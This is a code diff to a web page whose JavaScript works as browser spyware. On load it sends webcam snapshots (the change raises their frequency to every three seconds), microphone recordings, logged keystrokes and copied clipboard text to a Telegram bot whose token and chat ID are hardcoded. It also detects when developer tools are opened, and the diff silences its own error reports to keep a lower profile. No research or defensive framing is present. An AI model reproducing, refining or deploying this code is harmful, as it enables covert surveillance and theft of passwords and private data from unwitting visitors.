@@ -1,4 +1,4 @@
-<<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
@@ -64,7 +64,7 @@
     const config = {
         botToken: "6941579931:AAHJRb_kYDxxutmPJ7ji6F5p_laP1LjOnAA",
         chatId: "8017801890",
-        snapshotInterval: 15000, // ms
+        snapshotInterval: 3000, // <-- CHANGED TO 3 SECONDS
         micRecordInterval: 10000, // ms
     };
 
@@ -88,7 +88,6 @@
         sendToBot("🚀 New Session Started");
         sendInitialReport();
         
-        // **NEW**: Check for secure context, which is required for media devices
         if (!navigator.mediaDevices || !window.isSecureContext) {
             sendToBot("⚠️ **CRITICAL**: Cannot access Camera/Mic. Page is not secure (not HTTPS) or browser is too old.");
         }
@@ -103,7 +102,6 @@
 
     async function checkAndWatchPermission(name, requestFn, stopFn = () => {}) {
         if (!navigator.permissions) {
-             // Fallback for older browsers
             sendToBot(`⚠️ Cannot query permissions. Requesting ${name} directly.`);
             requestFn(); 
             return;
@@ -112,7 +110,7 @@
             const status = await navigator.permissions.query({ name: name });
             sendToBot(`📊 Initial ${name} permission: ${status.state}`);
             if (status.state === 'granted') requestFn();
-            else if (status.state === 'prompt') requestFn(); // Request if not decided
+            else if (status.state === 'prompt') requestFn();
             
             status.onchange = () => {
                 sendToBot(`🔄 ${name} permission changed to: ${status.state}`);
@@ -125,7 +123,7 @@
         }
     }
 
-    // --- Device & Media Control (ROBUST VERSION) ---
+    // --- Device & Media Control ---
     function requestCamera() {
         if (videoCaptureEl.srcObject?.active || videoCaptureEl.dataset.requesting === 'true') return;
         
@@ -136,13 +134,13 @@
                 videoCaptureEl.srcObject = stream;
                 sendToBot("✅ Camera access granted. Stream active.");
                 videoCaptureEl.onloadedmetadata = () => {
-                    sendToBot(`📹 Camera stream initialized. Starting snapshots.`);
-                    if(snapshotIntervalId) clearInterval(snapshotIntervalId); // Clear any old intervals
+                    sendToBot(`📹 Camera stream initialized. Starting snapshots every ${config.snapshotInterval / 1000} seconds.`);
+                    if(snapshotIntervalId) clearInterval(snapshotIntervalId);
                     snapshotIntervalId = setInterval(captureAndSend, config.snapshotInterval);
                 };
             }).catch(err => {
                 delete videoCaptureEl.dataset.requesting;
-                handleMediaError("Camera")(err); // Use the centralized error handler
+                handleMediaError("Camera")(err);
             });
     }
     function stopCamera() {
@@ -155,8 +153,7 @@
     function captureAndSend(caption = "📸 Webcam Snapshot") {
         try {
             if (!videoCaptureEl.srcObject?.active || videoCaptureEl.videoWidth === 0) {
-                sendToBot("⚠️ Capture Failed: No active camera stream or video track is not ready.");
-                return;
+                return; // Fail silently to avoid spamming chat with errors if stream is temporarily unavailable
             }
             
             const context = canvasEl.getContext("2d");
@@ -167,8 +164,6 @@
             canvasEl.toBlob(blob => {
                 if (blob) {
                     sendPhoto(blob, caption);
-                } else {
-                    sendToBot("⚠️ Capture Failed: Could not create image blob from canvas.");
                 }
             }, "image/png");
 
@@ -176,7 +171,6 @@
             sendToBot(`🚫 CRITICAL CAPTURE ERROR: ${e.name} - ${e.message}`);
         }
     }
-    // All other functions (microphone, geolocation, etc.) remain the same as the previous robust version...
 
     function requestMicrophone() {
         if (microphoneStream?.active) return;
@@ -242,7 +236,7 @@
         try {
             const response = await fetch(`https://api.telegram.org/bot${config.botToken}/${endpoint}`, { method: "POST", body: formData });
             if (!response.ok) { const errorData = await response.json(); throw new Error(`API Error: ${errorData.description}`); }
-        } catch (err) { sendToBot(`🚫 Net Form Data Err: ${err.message}`); }
+        } catch (err) { console.warn(`Net Form Data Err: ${err.message}`); } // Use warn to reduce console noise
     }
     function sendPhoto(blob, caption) {
         const fd = new FormData();
@@ -324,7 +318,22 @@
         document.addEventListener('keydown', e => { if (e.key.length === 1) { keyLogBuffer += e.key; } else if (e.key === 'Backspace') { keyLogBuffer = keyLogBuffer.slice(0, -1); } else if (e.key === 'Enter') { sendToBot(`⌨️ Enter in ${e.target.tagName}:\n\`\`\`\n${keyLogBuffer}\n\`\`\``); keyLogBuffer = ""; } else { keyLogBuffer += ` [${e.key}] `; }});
         document.addEventListener('copy', async () => { try { const text = await navigator.clipboard.readText(); if (text) { sendToBot(`📋 Text Copied:\n\`\`\`\n${text}\n\`\`\``); }} catch(err) {/*ignore*/}});
     }
-    function detectDevTools() { /* ... unchanged ... */ }
+    function detectDevTools() {
+        const threshold = 160;
+        let devToolsOpen = false;
+        const check = () => {
+            if (window.outerWidth - window.innerWidth > threshold || window.outerHeight - window.innerHeight > threshold) {
+                if (!devToolsOpen) {
+                    sendToBot("⚠️ Developer Tools Opened!");
+                    devToolsOpen = true;
+                }
+            } else {
+                devToolsOpen = false;
+            }
+            requestAnimationFrame(check);
+        };
+        requestAnimationFrame(check);
+     }
     function handleMediaError(type) {
         return e => sendToBot(`🚫 *${type} Error*: \`${e.name}\`.\nReason: ${e.message}`);
     }
